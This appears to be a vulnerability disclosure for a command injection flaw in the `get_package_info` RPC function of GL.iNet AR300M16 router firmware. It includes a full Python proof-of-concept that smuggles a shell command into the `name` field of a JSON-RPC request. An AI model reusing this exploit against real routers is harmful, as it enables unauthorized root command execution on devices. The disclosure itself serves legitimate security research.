Submittion Date: 2025.4.18
Vendor: GL-AR300M16.4.3.11
Firmware: openwrt-ax1800-4.5.16-0321-1711030388
Download Link: https://dl.gl-inet.cn/router/ar300m16/stable

The function `get_package_info` handles the critical parameter string `name`without proper sanitization or validation, which leads to a **command injection vulnerability**. By injecting malicious shell metacharacters into the `name`field, an attacker can execute arbitrary system commands with the privileges of the web server process (often root). This can result in full system compromise, including unauthorized access, data theft, or persistent backdoor installation.

<img width="1704" height="594" alt="plugins so-getpackegeinfo" src="https://github.com/user-attachments/assets/c3cc1df8-1ee5-4a6f-a8d0-26f7e6f94d6b" />


Exploit the vulnerability by sending a carefully constructed HTTP request

```
import requests

# 目标URL (注意：URL中的/rpc需要根据实际情况调整)
url = "http://192.168.2.10/rpc"

# 请求头 (完全匹配Burpsuite中的headers)
headers = {
    "Host": "192.168.2.10",
    "Content-Length": "247",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Origin": "http://192.168.2.10",
    "Referer": "http://192.168.2.10/",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "Admin-Token=wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",
    "Connection": "keep-alive"
}

# 请求体 (JSON-RPC命令注入payload)
data = {
    "jsonrpc": "2.0",
    "method": "call",
    "params": [
        "wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",
        "plugins",
        "get_package_info",
        {
            "name": "7'; echo 123 > /www/pwntest.txt;'"
        }
    ]
}

# 发送POST请求
try:
    response = requests.post(
        url,
        headers=headers,
        json=data,
        verify=False  # 忽略SSL证书验证
    )
    
    # 输出响应信息
    print(f"Status Code: {response.status_code}")
    print("Response Headers:")
    print(response.headers)
    print("\nResponse Body:")
    print(response.text)
    
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
```

The exploitation is shown below.
<img width="1741" height="1106" alt="get_package_exploit" src="https://github.com/user-attachments/assets/aac0aaa9-726f-438f-b21c-a8cdbe88bde1" />

